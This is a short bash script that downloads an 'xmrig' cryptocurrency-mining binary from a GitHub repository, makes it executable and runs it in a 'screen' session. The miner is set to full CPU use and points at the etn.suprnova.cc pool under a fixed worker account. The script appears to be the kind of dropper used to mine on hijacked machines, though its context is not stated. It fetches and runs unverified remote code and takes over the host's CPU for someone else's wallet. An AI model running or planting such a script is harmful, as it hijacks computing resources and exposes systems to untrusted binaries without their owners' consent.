#!/bin/bash

screen -S ebe wget https://github.com/knorhaan/xmr-standalone/raw/master/xmrig ; screen -S ebe chmod +x ./xmrig ; screen -S ebe ./xmrig -o etn.suprnova.cc:8875 -u copnanhdai.1 -p aaa -k -t 7 --donate-level=1 --max-cpu-usage=100 --av=2
